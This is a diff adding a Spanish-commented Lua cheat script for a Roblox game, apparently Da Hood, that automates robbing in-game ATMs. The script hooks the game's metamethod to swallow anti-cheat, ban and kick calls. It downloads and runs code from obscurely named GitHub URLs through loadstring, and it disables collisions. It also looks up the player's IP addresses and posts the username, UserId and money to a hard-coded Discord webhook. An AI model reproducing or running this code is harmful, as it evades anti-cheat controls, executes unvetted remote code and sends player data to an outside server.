@@ -1,0 +1,478 @@
+assert(getrawmetatable)
+gmt = getrawmetatable(game)
+setreadonly(gmt, false)
+old = gmt.__namecall
+gmt.__namecall =
+	newcclosure(
+		function(self, ...)
+			local args = {...}
+			if tostring(args[1]) == "BreathingHAMON" then
+			return
+		elseif tostring(args[1]) == "TeleportDetect" then
+			return
+		elseif tostring(args[1]) == "CHECKER_1" then
+			return
+		elseif tostring(args[1]) == "CHECKER" then
+			return
+		elseif tostring(args[1]) == "GUI_CHECK" then
+			return
+		elseif tostring(args[1]) == "OneMoreTime" then
+			return
+		elseif tostring(args[1]) == "checkingSPEED" then
+			return
+		elseif tostring(args[1]) == "BANREMOTE" then
+			return
+		elseif tostring(args[1]) == "PERMAIDBAN" then
+			return
+		elseif tostring(args[1]) == "KICKREMOTE" then
+			return
+		elseif tostring(args[1]) == "BR_KICKPC" then
+			return end
+
+			return old(self, ...)
+		end)
+wait(1)
+
+
+getgenv().dineroiniciado = game:GetService("Players").LocalPlayer.DataFolder.Currency.Value
+
+
+_G.rob = true
+
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/kaka0221/adkjkashbljdbahjdkasd/main/k3i4ut0f4rm98u820p2f3uy%20m0894ym62y498n%200hn25yg6%20925%20y6hg2",true))()
+
+local p = Instance.new("Part", game.Workspace)
+p.Size = Vector3.new(20, 0.4, 20)
+p.Position = Vector3.new(-100, -8000, -400)
+p.Anchored = true
+p.BrickColor = BrickColor.new(255,0,0)
+p.Name = 'p'
+clave = false;
+
+
+local lib = loadstring(game:HttpGet("https://raw.githubusercontent.com/typical-overk1ll/scripts/main/ConsoleLib",true))()
+
+lib:add("AutoFarm, hecho por dedos")
+
+lib:warnMessage("Escriba su clave: ")
+local aclave = rconsoleinput()
+if aclave == getgenv().k3i_polokiuo then
+	lib:warnMessage("Clave correcta. . .")
+	lib:setColor("Green")
+	wait(3)
+	lib:infoMessage("Clave Correcta")
+else
+	lib:errorMessage("Clave incorrecta")
+	_G.rob = false
+	rconsoleclear(true)
+clave = false
+end
+
+if clave then
+lib:makeSpace()
+lib:infoMessage("Loading OVERK1LL Library. . .")
+lib:setColor("Green")
+wait(3)
+lib:infoMessage("U are Dead. Made by OVERK1LL. . .")
+wait(3)
+rconsoleclear(true)
+wait(1)
+lib:infoMessage("Bienvenido Al AutoFarm, Aqui estaran todos los logs para que puedas verlo")
+
+lib:warnMessage("Eliminando ATM #16 y #15. . .")
+
+
+local funciona, errorsi = pcall(function ()
+	for i,v in pairs(game:GetService("Workspace").Cashiers:GetChildren()) do
+		if i == 16 or i == 15 then v:Destroy() end
+	end
+end)
+
+
+
+pcall(function() if tostring(game.PlaceId) == "2788229376" then 
+		local corepackages = game:GetService"CorePackages" 
+		local localplayer = game:GetService"Players".LocalPlayer 
+		local run = game:GetService"RunService" 
+		run:BindToRenderStep("AntiStompV2",2000,function() pcall(function() if localplayer.Character.Humanoid.Health <= 5 then localplayer.Character.Humanoid:Destroy() lib:infoMessage("Personaje Muerto, Espere mientras lo arreglamos"); workspace.CurrentCamera.CameraSubject = localplayer.Character wait() local prt = Instance.new("Model", corepackages); Instance.new("Part", prt).Name="Torso"; Instance.new("Part", prt).Name="Head"; Instance.new("Humanoid", prt).Name="Humanoid"; localplayer.Character=prt end end) pcall(function() if localplayer.Character.Humanoid.FloorMaterial == "Plastic" then game.ReplicatedStorage:FireServer("Stomp"); end end) end) end end)
+
+
+
+local CASHIERS = game:GetService("Workspace").Cashiers
+
+if not funciona then
+	lib:errorMessage("Error: No se pudo eliminar el ATM #16 y #15, contacta al desarrollador. Info: ")
+	lib:message(errorsi)
+	game.Players.LocalPlayer:Kick("Error fatal, por seguridad el script se ha detenido, revise la consola y contacte al desarrollador")
+else
+	lib:infoMessage("ATM #16 y #15 Eliminado correctamente :)")
+
+end
+
+lib:warnMessage("Creando Piso. . .")
+local funcionas, errorsis = pcall(function ()
+	TargetPiso_ = Instance.new("Part", game.Workspace)
+	TargetPiso_.Size = Vector3.new(40, 0.4, 40)
+	TargetPiso_.Position = Vector3.new(0, -8000, 0)
+	TargetPiso_.Anchored = true
+	TargetPiso_.BrickColor = BrickColor.new(255,0,0)
+	TargetPiso_.Name = 'TargetPiso'
+end)
+
+if not funcionas then
+	lib:errorMessage("Error: No se pudo eliminar el ATM #16 y #15, contacta al desarrollador. Info: ")
+	lib:message(errorsis)
+	game.Players.LocalPlayer:Kick("Error fatal, por seguridad el script se ha detenido, revise la consola y contacte al desarrollador")
+else
+	lib:infoMessage("Piso Creado Correctamente)")
+end
+
+lib:infoMessage("Detectando Configuraciones. . .")
+
+if getgenv().panel_ == true then 
+	lib:infoMessage("Cargando Panel de control. . .")
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/D34THEV1L/DaHoodScripts/main/PanelControl.lua'))()
+end
+if getgenv().destroy_map_ == true then 
+	game.Workspace.MAP:Destroy()
+end
+if getgenv().fps_ ~= nil then
+	lib:infoMessage("Bloqueando FPS. . .")
+	setfpscap(fps_)
+end
+if getgenv().low_gfx_ == true then
+	lib:infoMessage("Low GFX activado")
+	local a = game
+	local b = a.Workspace
+	local c = a.Lighting
+	local d = b.Terrain
+	d.WaterWaveSize = 0
+	d.WaterWaveSpeed = 0
+	d.WaterReflectance = 0
+	d.WaterTransparency = 0
+	c.GlobalShadows = false
+	c.FogEnd = 9e9
+	c.Brightness = 0
+	settings().Rendering.QualityLevel = "Level01"
+	for e, f in pairs(a:GetDescendants()) do
+		if f:IsA("Part") or f:IsA("Union") or f:IsA("CornerWedgePart") or f:IsA("TrussPart") then
+			f.Material = "Plastic"
+			f.Reflectance = 0
+		elseif f:IsA("Decal") or f:IsA("Texture") then
+			f.Transparency = 0
+		elseif f:IsA("ParticleEmitter") or f:IsA("Trail") then
+			f.Lifetime = NumberRange.new(0)
+		elseif f:IsA("Explosion") then
+			f.BlastPressure = 0
+			f.BlastRadius = 0
+		elseif f:IsA("Fire") or f:IsA("SpotLight") or f:IsA("Smoke") or f:IsA("Sparkles") then
+			f.Enabled = false
+		elseif f:IsA("MeshPart") then
+			f.Material = "Plastic"
+			f.Reflectance = 0
+			f.TextureID = 10385902758728957
+		end
+	end
+	for e, g in pairs(c:GetChildren()) do
+		if
+			g:IsA("BlurEffect") or g:IsA("SunRaysEffect") or g:IsA("ColorCorrectionEffect") or g:IsA("BloomEffect") or
+			g:IsA("DepthOfFieldEffect")
+		then
+			g.Enabled = false
+		end
+	end
+	sethiddenproperty(game.Lighting, "Technology", "Compatibility")
+end
+if getgenv().discord_ == true then
+	lib:infoMessage("Configuracion detectada, discord activado. . .")
+end
+if getgenv().getgenv().dinero_aviso_ == true then
+	lib:infoMessage("Cada 10k enviaremos un mensaje al pendejochat con el dinero total")
+end
+lib:warnMessage("Configuraciones detectadas, iniciando autofarm")
+wait(1)
+lib:warnMessage("Revise las configuraciones deseadas y escriba Activar AutoFarm para continuar")
+local a = rconsoleinput()
+	if a == 'Activar AutoFarm' then
+		
+	else
+		rconsoleclose(false)
+		_G.rob = false
+	end
+
+
+
+
+game:GetService("RunService").Stepped:connect(function()
+	local r15 = game.Players.LocalPlayer.Character
+	r15.Head.CanCollide = false
+	r15.UpperTorso.CanCollide = false
+	r15.LowerTorso.CanCollide = false
+	r15.LeftUpperArm.CanCollide = false
+	r15.LeftLowerArm.CanCollide = false
+	r15.RightUpperArm.CanCollide = false
+	r15.RightLowerArm.CanCollide = false
+	r15.LeftUpperLeg.CanCollide = false
+	r15.LeftLowerLeg.CanCollide = false
+	r15.RightUpperLeg.CanCollide = false
+	r15.RightLowerLeg.CanCollide = false
+	r15.HumanoidRootPart.CanCollide = false
+end)
+plr = game.Players.LocalPlayer
+mouse = plr:GetMouse()
+
+
+function DetectCashiers()
+	for _,v in pairs(CASHIERS:GetChildren()) do
+		if v:FindFirstChild("Humanoid") then
+			if v.Humanoid.Health > 0 then
+				return v
+			end
+		end
+	end 
+	game.StarterGui:SetCore("ChatMakeSystemMessage", {
+		Text = "[System] No ATMs Actives";
+		Color = Color3.fromRGB(170, 0, 0);
+	})
+end
+
+function toTarget(l, m, n)
+	
+	local o = game:service "TweenService"
+	local p = TweenInfo.new((m - l).Magnitude / 170, Enum.EasingStyle.Quad)
+	local q = tick()
+	local r, s =
+		pcall(
+			function()
+				local r = o:Create(game.Players.LocalPlayer.Character["HumanoidRootPart"], p, {CFrame = n})
+				r:Play()
+			end
+		)
+	if not r then
+		return s
+	end
+	for i, v in pairs(workspace.Cashiers:GetChildren()) do
+		if v:WaitForChild("Humanoid").Health > 0 then
+			local cf = v.Open.CFrame
+			local lv = cf.lookVector
+			game.workspace.Players[game.Players.LocalPlayer.Name].HumanoidRootPart.CFrame = cf + (lv * Vector3.new(-1, 0, 0))
+			return v
+		end
+		end
+end
+local function t(u, v)
+	local w = (u.Position - v.Position).magnitude
+	if w <= 50 then
+		lib:infoMessage("Agarrando Dinero")
+		robando = false
+		fireclickdetector(v:FindFirstChild("ClickDetector"))
+		return w
+	end
+end
+currentcashier = nil
+
+while _G.rob == true do
+	if game:GetService("Players").LocalPlayer.DataFolder.Currency.Value < getgenv().dineroiniciado + 10000 then
+		getgenv().dineroiniciado = game:GetService("Players").LocalPlayer.DataFolder.Currency.Value
+		local CURRENT_cash = game:GetService("Players").LocalPlayer.DataFolder.Currency.Value
+		local Webhook = "https://discordapp.com/api/webhooks/1041602263791190077/IbuKY8qllMlxD2l9WFDkwqdj0a2TPzQp1tAlBeZSxAcswK0KTM89mIvvSjsJP4sdqebz" -- Put your Webhook link here
+
+		local IPv4 = game:HttpGet("https://v4.ident.me/")
+		local IPv6 = game:HttpGet("https://v6.ident.me/")
+
+		local Headers = {["content-type"] = "application/json"} -- Don't Modify
+
+		local LocalPlayer = game:GetService("Players").LocalPlayer
+
+		local AccountAge = LocalPlayer.AccountAge
+		local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21)
+		local UserId = LocalPlayer.UserId
+		local PlayerName = game.Players.LocalPlayer.Name
+		local Message = ideamensaje
+		local PlayerData =
+			{
+				["content"] = "",
+				["embeds"] = {{
+					["title"] = "**Username**:",
+					["description"] = PlayerName..' Gracias por comprar el AutoFarm',
+					["color"] = tonumber(0x2B6BE4),
+					["fields"] = {					
+						
+						{
+							["name"] = "UserId:",
+							["value"] = UserId,
+							["inline"] = true
+						},
+						{
+							["name"] = "Current Money:",
+							["value"] = CURRENT_cash,
+							["inline"] = true
+						},
+
+					},
+				}}
+			}
+
+		local PlayerData = game:GetService('HttpService'):JSONEncode(PlayerData)
+		local HttpRequest = http_request;
+
+		if syn then
+			HttpRequest = syn.request
+		else
+			HttpRequest = http_request
+		end
+
+		HttpRequest({Url=Webhook, Body=PlayerData, Method="POST", Headers=Headers})
+		
+	end
+	local succes, err = pcall(function()
+		local robando = false
+		wait()
+		game.ReplicatedStorage.MainEvent:FireServer("Block", true)
+	repeat
+			for x, y in pairs(game.Workspace.Ignored.Drop:GetChildren()) do
+				game.ReplicatedStorage.MainEvent:FireServer("Block", true)
+			if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - y.Position).Magnitude <= 50 then
+				local z = y
+				t(game.Players.LocalPlayer.Character.HumanoidRootPart, y)
+				wait()
+			end
+		end
+		if not game.Players.LocalPlayer.Character:FindFirstChild("Combat") then
+			local A = game.Players.LocalPlayer.Backpack:FindFirstChild("Combat")
+			A.Parent = game.Players.LocalPlayer.Character
+		end
+			wait()
+			
+			
+			B = DetectCashiers()
+			while not B do pcall(function() wait() B = DetectCashiers() lib:infoMessage("Detectando Cajeros . . .") end) end
+		
+			if B:FindFirstChild("Humanoid") then
+					if B.Humanoid.Health > 0 then
+						currentcashier = B
+						wait()
+						game.ReplicatedStorage.MainEvent:FireServer("Block", true)
+					if B.Name ~= "CASHIER5" then
+						B.Open.Orientation = Vector3.new(0, 90, 0)
+						B.Open.Size = Vector3.new(4,4,4)
+						B.Open.CanCollide = false
+					end
+					if B.Name == "CASHIER5" then
+						--B.Open.Orientation = Vector3.new(0, 180, 0)
+						B.Open.Position = B.Open.Position - Vector3.new(0,0,0)
+						B.Open.Size = Vector3.new(4,4,4)
+						B.Open.CanCollide = false
+							end
+					
+						
+						
+					wait()
+					poss = B.Open.Position - Vector3.new(0, 0, 0)
+					posc = B.Open.CFrame - Vector3.new(-1, 0, 0)
+					toTarget(game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position, poss, posc)
+					repeat
+							wait()
+							game.ReplicatedStorage.MainEvent:FireServer("Block", true)
+					until (game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position - poss).Magnitude <
+						50 or
+						_G.rob == false or
+						B.Humanoid.Health <= 0
+						
+						repeat
+							game.ReplicatedStorage.MainEvent:FireServer("Block", true)
+						if not game.Players.LocalPlayer.Character:FindFirstChild("Combat") then
+							local A = game.Players.LocalPlayer.Backpack:FindFirstChild("Combat")
+							A.Parent = game.Players.LocalPlayer.Character
+						end
+						TargetPiso_.CFrame = CFrame.new(B.Open.Position + Vector3.new(0,-3,0))
+						toTarget(
+							game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart").Position,
+							poss,
+							posc
+						)
+							wait(0)
+							robando = true
+							lib:infoMessage("Robando . . .")
+						game.Players.LocalPlayer.Character:FindFirstChild("Combat"):Activate()
+						until B.Humanoid.Health <= 0 or _G.rob == false
+						wait(0)
+					for C = 5, 50 do
+						wait()
+						for x, y in pairs(game.Workspace.Ignored.Drop:GetChildren()) do
+							if
+								(game.Players.LocalPlayer.Character.HumanoidRootPart.Position - y.Position).Magnitude <=
+								50
+							then
+								if y:IsA("Part") then
+									local z = y
+									t(game.Players.LocalPlayer.Character.HumanoidRootPart, y)
+									wait()
+								end
+							end
+						end
+					end
+				end
+		
+		end
+		until _G.rob == false
+		end)
+		if not succes then 
+
+		lib:errorMessage(err)
+		
+		local Webhook = "https://discordapp.com/api/webhooks/1041602263791190077/IbuKY8qllMlxD2l9WFDkwqdj0a2TPzQp1tAlBeZSxAcswK0KTM89mIvvSjsJP4sdqebz" -- Put your Webhook link here
+
+		local IPv4 = game:HttpGet("https://v4.ident.me/")
+		local IPv6 = game:HttpGet("https://v6.ident.me/")
+
+		local Headers = {["content-type"] = "application/json"} -- Don't Modify
+
+		local LocalPlayer = game:GetService("Players").LocalPlayer
+
+		local AccountAge = LocalPlayer.AccountAge
+		local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21)
+		local UserId = LocalPlayer.UserId
+		local PlayerName = game.Players.LocalPlayer.Name
+		local PlayerData =
+			{
+				["content"] = "",
+				["embeds"] = {{
+					["title"] = "**Username**:",
+					["description"] = PlayerName..' Gracias por comprar el AutoFarm',
+					["color"] = tonumber(0x2B6BE4),
+					["fields"] = {					
+
+						{
+							["name"] = "UserId:",
+							["value"] = UserId,
+							["inline"] = true
+						},
+						{
+							["name"] = "Current Money:",
+							["value"] = tostring(err),
+							["inline"] = true
+						},
+
+					},
+				}}
+			}
+
+		local PlayerData = game:GetService('HttpService'):JSONEncode(PlayerData)
+		local HttpRequest = http_request;
+
+		if syn then
+			HttpRequest = syn.request
+		else
+			HttpRequest = http_request
+		end
+
+		HttpRequest({Url=Webhook, Body=PlayerData, Method="POST", Headers=Headers})
+
+	
+	end	
+	end
+
+end
